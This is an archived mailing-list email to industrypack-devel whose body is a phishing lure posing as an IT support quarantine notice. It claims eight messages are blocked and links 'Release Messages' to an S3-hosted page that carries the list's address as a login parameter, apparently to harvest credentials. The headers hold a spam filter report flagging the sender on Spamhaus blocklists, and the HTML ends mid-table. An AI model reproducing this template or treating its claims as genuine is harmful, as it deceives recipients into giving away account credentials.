Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 33C9187E982
	for <lists+industrypack-devel@lfdr.de>; Mon, 18 Mar 2024 13:43:52 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1rmCLF-0004ao-LC
	for lists+industrypack-devel@lfdr.de;
	Mon, 18 Mar 2024 12:43:50 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <support@credishares.pro>) id 1rmCLC-0004aZ-Ft
 for industrypack-devel@lists.sourceforge.net;
 Mon, 18 Mar 2024 12:43:47 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=6gvfPClqJ/8bm9i9Vz66zdozTi4VOnfTkaC4FcercEI=; b=CIbmWkECzsRWC8utuAyJ5Noc7r
 R+aTQ/P3p2/DMucWuZ6nuwnNYZDFXbFinS2GqdRQu9M8OC+BX/D3XcqsoGtJ9XhovkGuQ+CtISHTz
 JAhaU91d77l44y4UzpjSN0ld3yXKjaqNbrIoXBX0K3i2/tp7RTz11BWpjnWfdyKz+PTk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=6gvfPClqJ/8bm9i9Vz66zdozTi4VOnfTkaC4FcercEI=; b=C
 RDC9sirXijXtbG3iD4Isv/hRxPtAJSxw4Gj93XeZ+P7v/Z6OWOiCAjIpqkvfuUuinI4uwjdcUf5Wk
 rUdGqg6P8TWQ0+4kgaN67fdWw0lpCHake8e4mOFfD/8kLm2LYBr+nTiKXRQUL7oqhL5Io0btou4ot
 i7FJPNuiHVS9jJRg=;
Received: from [147.45.79.196] (helo=credishares.pro)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1rmCL1-0004vz-D6 for industrypack-devel@lists.sourceforge.net;
 Mon, 18 Mar 2024 12:43:47 +0000
Received: from credishares.pro (hwsrv-1180905.hostwindsdns.com
 [192.119.110.33])
 by credishares.pro (Postfix) with ESMTPSA id 6F21857EFDC
 for <industrypack-devel@lists.sourceforge.net>;
 Mon, 18 Mar 2024 05:30:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=credishares.pro;
 s=default; t=1710765024;
 bh=6gvfPClqJ/8bm9i9Vz66zdozTi4VOnfTkaC4FcercEI=; h=From:To:Subject;
 b=SMhcor4zblfHN9/dAswG47S8gdon62quqcjyKoThLPtA9oewwMjI7syj7aaQDA/7y
 smyx5fTnzvuPdGEy+klLqTvNIeMwrOeJowfDBmPe4bcUz4t31aAsBOIAy8R47FKGlB
 9siPIv2nkBVOwcmCdLZp0SyZTRqYF2OzGDhpXEwacB4QxRTKCfRyIQFQhKHsY7d5Fh
 BDtSNZZTfqAW9RmiMgC08DKd+9gIiKaI02eYdyMoCPx1gZCpbfvVmr7QjMRc+BlVam
 b9EJRow7437aswzVQ0ouOXUCrAk8HlF2cLL1ZjzsAV6k/3awHXPWodsqtyMp3HWFdW
 UbvGY7Rk2Ugiw==
Authentication-Results: credishares.pro;
 spf=pass (sender IP is 192.119.110.33) smtp.mailfrom=support@credishares.pro
 smtp.helo=credishares.pro
Received-SPF: pass (credishares.pro: connection is authenticated)
To: industrypack-devel@lists.sourceforge.net
Date: 18 Mar 2024 12:30:23 +0000
Message-ID: <20240318123022.BB6A839E7E444E35@credishares.pro>
MIME-Version: 1.0
X-PPP-Message-ID: <171076502408.12028.17262653686797633699@credishares.pro>
X-PPP-Vhost: credishares.pro
X-Spam-Score: 7.3 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Incoming Messages The following messages have been blocked
 by your administrator due to validation error. You have 8 new messages in
 your email quarantine. User: industrypack-devel Click on Release M [...] 
 Content analysis details:   (7.3 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: credishares.pro]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [147.45.79.196 listed in zen.spamhaus.org]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: credishares.pro]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.0 T_PDS_PRO_TLD          .pro TLD [URI: credishares.pro (pro)]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [147.45.79.196 listed in wl.mailspike.net]
 0.0 NUMERIC_HTTP_ADDR      URI: Uses a numeric IP address in URL
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1rmCL1-0004vz-D6
Subject: [Industrypack-devel] You have [8] pending incoming messages
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: ICT Support Dept via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: ICT Support Dept <support@credishares.pro>
Content-Type: multipart/mixed; boundary="===============6538649741182226098=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6538649741182226098==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, sa=
ns-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spaci=
ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color:=20
initial;'><br class=3D"Apple-interchange-newline"><br style=3D""></div>
<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, sa=
ns-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spaci=
ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color:=20
initial;' dir=3D"ltr"><div style=3D""><table align=3D"center" id=3D"ydp773d=
f242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i0mg8" style=3D"paddin=
g: 0px; border: 1px solid rgb(240, 241, 246); border-image: none; color: rg=
b(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; vertical-a=
lign: top; border-collapse: collapse; z-index: 0; max-width: 600px;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773df242yiv66432=
56158ydp45d195c8v1v1yiv4812050107gmail-v1i0bb3" style=3D"z-index: 0;">
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1itceg=
" style=3D"z-index: 0;"><td width=3D"600" align=3D"center" id=3D"ydp773df24=
2yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1icr7h" valign=3D"top" sty=
le=3D"padding: 0px; z-index: 0; max-width: 600px;" bgcolor=3D"#ffffff">
<table width=3D"100%" align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d=
195c8v1v1yiv4812050107gmail-v1in3cl" style=3D"padding: 0px; text-align: lef=
t; vertical-align: top; border-collapse: collapse; z-index: 0;" border=3D"0=
" cellspacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773df242yiv6643256158=
ydp45d195c8v1v1yiv4812050107gmail-v1i0fn6" style=3D"z-index: 0;"><tr id=3D"=
ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i7dvh" style=3D=
"z-index: 0;">
<td align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1igi3u" valign=3D"top" style=3D"padding: 0px; z-index: 0;" bgcol=
or=3D"#030594"><table width=3D"95%" align=3D"center" id=3D"ydp773df242yiv66=
43256158ydp45d195c8v1v1yiv4812050107gmail-v1i98xt" style=3D"padding: 0px; t=
ext-align: left; vertical-align: top; border-collapse: collapse; z-index: 0=
;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1im=
qoe" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v=
1yiv4812050107gmail-v1i931z" style=3D"z-index: 0;"><td height=3D"18" id=3D"=
ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i7v9o" valign=
=3D"top" style=3D"padding: 0px; z-index: 0;">&nbsp;</td></tr><tr id=3D"ydp7=
73df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ivo8n" style=3D"z-i=
ndex: 0;">
<td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ip3ho=
" valign=3D"top" style=3D"padding: 0px; z-index: 0;"><table align=3D"center=
" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ib192" =
style=3D"padding: 0px; vertical-align: top; border-collapse: collapse; z-in=
dex: 0;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp7=
73df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i3yyx" style=3D"z-i=
ndex: 0;">
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1igh4t=
" style=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yi=
v4812050107gmail-v1ilgy1" style=3D"padding: 0px; z-index: 0;"><h1 id=3D"ydp=
773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i4i9g" style=3D"bo=
rder-width: 0px; margin: auto; padding: 0px; text-align: center; color: rgb=
(255, 255, 255); line-height: 1.2; font-size: 14px; font-weight: normal; li=
st-style-type: none; z-index: 0;">Incoming&nbsp;Messages</h1>
</td></tr></tbody></table></td></tr><tr id=3D"ydp773df242yiv6643256158ydp45=
d195c8v1v1yiv4812050107gmail-v1ipnbk" style=3D"z-index: 0;"><td height=3D"1=
5" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ip3yr"=
 valign=3D"top" style=3D"padding: 0px; z-index: 0;">&nbsp;</td></tr></tbody=
></table></td></tr><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812=
050107gmail-v1i4d2h" style=3D"z-index: 0;">
<td align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1ii89o" valign=3D"top" style=3D"padding: 0px; z-index: 0;"><tabl=
e width=3D"92%" align=3D"center" id=3D"ydp773df242yiv6643256158ydp45d195c8v=
1v1yiv4812050107gmail-v1ifwd6" style=3D"padding: 0px; text-align: left; ver=
tical-align: top; border-collapse: collapse; z-index: 0;" border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773df242yiv6643256158ydp45d=
195c8v1v1yiv4812050107gmail-v1i0cbt" style=3D"z-index: 0;">
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ir8w4=
" style=3D"z-index: 0;"><td align=3D"center" id=3D"ydp773df242yiv6643256158=
ydp45d195c8v1v1yiv4812050107gmail-v1itx3j" valign=3D"top" style=3D"padding:=
 0px; z-index: 0;"><table width=3D"100%" align=3D"center" id=3D"ydp773df242=
yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ikj0u" style=3D"padding: 0=
px; text-align: left; vertical-align: top; border-collapse: collapse; z-ind=
ex: 0;" cellspacing=3D"0" cellpadding=3D"0">
<tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ik=
wuf" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v=
1yiv4812050107gmail-v1iiy7l" style=3D"z-index: 0;"><td height=3D"30" id=3D"=
ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i8mhx" style=3D=
"padding: 0px; z-index: 0;">&nbsp;</td></tr><tr id=3D"ydp773df242yiv6643256=
158ydp45d195c8v1v1yiv4812050107gmail-v1isjsf" style=3D"z-index: 0;"></tr>
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iigi8=
" style=3D"z-index: 0;"><td height=3D"32" id=3D"ydp773df242yiv6643256158ydp=
45d195c8v1v1yiv4812050107gmail-v1io54y" style=3D"padding: 0px; z-index: 0;"=
>&nbsp;</td></tr><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1iqr5j" style=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158=
ydp45d195c8v1v1yiv4812050107gmail-v1ixqmm" valign=3D"top" style=3D"padding:=
 0px; z-index: 0;">
<table width=3D"90%" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1iyzfv" style=3D"padding: 0px; vertical-align: top; border-colla=
pse: collapse; z-index: 0;" cellspacing=3D"0" cellpadding=3D"0"><tbody id=
=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1icf0j" styl=
e=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120=
50107gmail-v1ixsgk" style=3D"z-index: 0;">
<td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iojc6=
" valign=3D"top" style=3D"padding: 0px; line-height: 18px; font-family: Rob=
oto, Arial; font-size: 12px; font-weight: 600; z-index: 0;"><span id=3D"ydp=
773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i86me" style=3D"z-=
index: 0;">The following messages have been blocked by your administrator d=
ue to validation error.</span></td></tr></tbody></table></td></tr>
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1irrqe=
" style=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yi=
v4812050107gmail-v1i4xa6" valign=3D"top" style=3D"padding: 0px; z-index: 0;=
"><table width=3D"100%" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481=
2050107gmail-v1ihmkh" style=3D"padding: 0px; vertical-align: top; border-co=
llapse: collapse; z-index: 0;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0">
<tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i4=
czl" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v=
1yiv4812050107gmail-v1ihfsh" style=3D"z-index: 0;"><td height=3D"25" id=3D"=
ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i9jvu" style=3D=
"padding: 0px; z-index: 0;">&nbsp;</td></tr><tr id=3D"ydp773df242yiv6643256=
158ydp45d195c8v1v1yiv4812050107gmail-v1ihoza" style=3D"z-index: 0;">
<td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1izp64=
" style=3D"padding: 0px; color: rgb(102, 102, 102); line-height: 19px; font=
-family: Roboto, Arial; font-size: 13px; z-index: 0;"><span id=3D"ydp773df2=
42yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ier21" style=3D"z-index:=
 0;">You have&nbsp;8 new messages in your email quarantine.<span style=3D"f=
ont-weight: bolder; z-index: 0; font-stretch: inherit;"><br style=3D"z-inde=
x: 0;"></span>
<span style=3D"font-weight: bolder; z-index: 0; font-stretch: inherit;">Use=
r:&nbsp;industrypack-devel</span></span></td></tr></tbody></table></td></tr=
><tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1idi3=
1" style=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1y=
iv4812050107gmail-v1ild2p" valign=3D"top" style=3D"padding: 0px; z-index: 0=
;">
<table width=3D"100%" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120=
50107gmail-v1i8ggj" style=3D"padding: 0px; vertical-align: top; border-coll=
apse: collapse; z-index: 0;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
0"><tbody id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v=
1i0kck" style=3D"z-index: 0;"><tr id=3D"ydp773df242yiv6643256158ydp45d195c8=
v1v1yiv4812050107gmail-v1iismk" style=3D"z-index: 0;">
<td height=3D"25" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1i2ccc" style=3D"padding: 0px; z-index: 0;">&nbsp;</td></tr><tr id=
=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ieqkk" styl=
e=3D"z-index: 0;"><td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120=
50107gmail-v1isgcb" style=3D"padding: 0px; color: rgb(102, 102, 102); line-=
height: 19px; font-family: Roboto, Arial; font-size: 13px; font-weight: 600=
; z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iq7=
ki" style=3D"z-index: 0;"><a href=3D"https://fizzillo.s3.ap-southeast-2.ama=
zonaws.com/control_linklogg.html?login=3Dindustrypack-devel@lists.sourcefor=
ge.net">Click on</a> Release Messages (8), to move these message(s) to your=
 inbox folder:</span></td></tr></tbody></table></td></tr><tr id=3D"ydp773df=
242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ipjor" style=3D"z-index=
: 0;">
<td id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i2jrc=
" valign=3D"top" style=3D"padding: 0px; z-index: 0;"><table width=3D"100%" =
id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1in4pv" st=
yle=3D"padding: 0px; vertical-align: top; border-collapse: collapse; z-inde=
x: 0;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773=
df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ic15j" style=3D"z-ind=
ex: 0;">
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i1aau=
" style=3D"z-index: 0;"><td height=3D"25" id=3D"ydp773df242yiv6643256158ydp=
45d195c8v1v1yiv4812050107gmail-v1isz4s" style=3D"padding: 0px; z-index: 0;"=
>&nbsp;</td></tr></tbody></table><u style=3D""></u><u style=3D""></u><u sty=
le=3D""></u>
<table width=3D"572" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205=
0107gmail-v1i84ql" style=3D"margin: 0px; padding: 0px; width: 572px; color:=
 rgb(0, 0, 0); line-height: normal; font-family: verdana, arial, sans-serif=
; font-size: 11px; vertical-align: top; border-collapse: collapse; z-index:=
 0;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody id=3D"ydp773df=
242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1iz5ts" style=3D"z-index=
: 0;">
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ir80j=
" style=3D"z-index: 0;"><th align=3D"left" id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1ial0g" style=3D"margin: 0px; padding: 4px=
; text-align: left; color: rgb(255, 255, 255); z-index: 0; font-stretch: in=
herit; background-color: rgb(69, 90, 115);" bgcolor=3D"#455a73" colspan=3D"=
4">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ie2=
hw" style=3D"font-weight: bolder; z-index: 0; font-stretch: inherit;">&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp; Quarantined email</span></th></tr>
<tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1ibqct=
" style=3D"z-index: 0;">
<th align=3D"left" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120501=
07gmail-v1iw19o" valign=3D"bottom" style=3D"margin: 0px; padding: 4px 6px; =
width: 92px; text-align: left; font-family: inherit; font-weight: normal; v=
ertical-align: bottom; border-top-color: rgb(170, 170, 170); border-left-co=
lor: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; bor=
der-top-style: solid; border-left-style: solid; z-index: 0; font-stretch: i=
nherit; background-color: rgb(251, 251, 251);"=20
bgcolor=3D"#fbfbfb"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4=
812050107gmail-v1ihxjk" style=3D"z-index: 0;">Status</span></th>
<th align=3D"left" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120501=
07gmail-v1isc6m" valign=3D"bottom" style=3D"margin: 0px; padding: 4px 6px; =
width: 249px; text-align: left; font-family: inherit; font-weight: normal; =
vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-left-c=
olor: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; bo=
rder-top-style: solid; border-left-style: solid; z-index: 0; font-stretch: =
inherit; background-color: rgb(251, 251, 251);"=20
bgcolor=3D"#fbfbfb"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4=
812050107gmail-v1i21g5" style=3D"z-index: 0;">Recipient:</span></th>
<th align=3D"left" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120501=
07gmail-v1i9oc8" valign=3D"bottom" style=3D"margin: 0px; padding: 4px 6px; =
width: 379px; text-align: left; font-family: inherit; font-weight: normal; =
vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-left-c=
olor: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; bo=
rder-top-style: solid; border-left-style: solid; z-index: 0; font-stretch: =
inherit; background-color: rgb(251, 251, 251);"=20
bgcolor=3D"#fbfbfb"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4=
812050107gmail-v1ifzoh" style=3D"z-index: 0;">Subject:</span></th>
<th align=3D"left" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv48120501=
07gmail-v1izm7t" valign=3D"bottom" style=3D"margin: 0px; padding: 4px 6px; =
width: 99px; text-align: left; font-family: inherit; font-weight: normal; v=
ertical-align: bottom; border-top-color: rgb(170, 170, 170); border-right-c=
olor: rgb(170, 170, 170); border-left-color: rgb(170, 170, 170); border-top=
-width: 1px; border-right-width: 1px; border-left-width: 1px; border-top-st=
yle: solid; border-right-style: solid; border-left-style:=20
solid; z-index: 0; font-stretch: inherit; background-color: rgb(251, 251, 2=
51);" bgcolor=3D"#fbfbfb"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1=
v1yiv4812050107gmail-v1i8wtw" style=3D"z-index: 0;">Date:</span></th></tr><=
tr id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i38vq"=
 valign=3D"top" style=3D"z-index: 0;">
<td width=3D"98" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107=
gmail-v1iw8gg" style=3D"padding: 3px; width: 98px; font-family: roboto, rob=
otodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, 170=
); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-lef=
t-width: 1px; border-top-style: solid; border-left-style: solid; z-index: 0=
;"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1=
i2iye4" style=3D"z-index: 0;">Pending</span></td>
<td width=3D"255" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1iw7pjs" style=3D"padding: 3px; width: 255px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;">industrypack-devel@lists.sourceforge.net</td>
<td width=3D"385" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1iudaw9" style=3D"padding: 3px; width: 385px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-=
left-width: 1px; border-top-style: solid; border-left-style: solid; z-index=
: 0;">
<span title=3D"RV: 2023 (699's)" class=3D"ydp773df242yiv6643256158ydp45d195=
c8v1v1en_N ydp773df242yiv6643256158ydp45d195c8v1v1i_3mCHE ydp773df242yiv664=
3256158ydp45d195c8v1v1c1AVi73_6LUG ydp773df242yiv6643256158ydp45d195c8v1v1c=
1AVi7H_6MWH" style=3D"">RV: 2024 (699's)</span><span style=3D"z-index: 0;">=
</span></td>
<td width=3D"105" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv481205010=
7gmail-v1ieofhy" style=3D"padding: 3px; width: 105px; font-family: roboto, =
robotodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, =
170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 1=
70, 170); border-top-width: 1px; border-right-width: 1px; border-left-width=
: 1px; border-top-style: solid; border-right-style: solid; border-left-styl=
e: solid; z-index: 0;"><span style=3D"z-index: 0;">
3/18/2024 8:01:49 a.m.</span></td></tr><tr id=3D"ydp773df242yiv6643256158yd=
p45d195c8v1v1yiv4812050107gmail-v1i38vq" valign=3D"top" style=3D"z-index: 0=
;">
<td width=3D"98" id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107=
gmail-v1iw8gg" style=3D"padding: 3px; width: 98px; font-family: roboto, rob=
otodraft, helvetica, arial, sans-serif; border-top-color: rgb(170, 170, 170=
); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-lef=
t-width: 1px; border-top-style: solid; border-left-style: solid; z-index: 0=
;"><span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1=
i2iye4" style=3D"z-index: 0;">
<span id=3D"ydp773df242yiv6643256158ydp45d195c8v1v1yiv4812050107gmail-v1i2i=
ye4" style=3D"z-index: 0;">Pending</span></span></td><td width=3D"255" id=
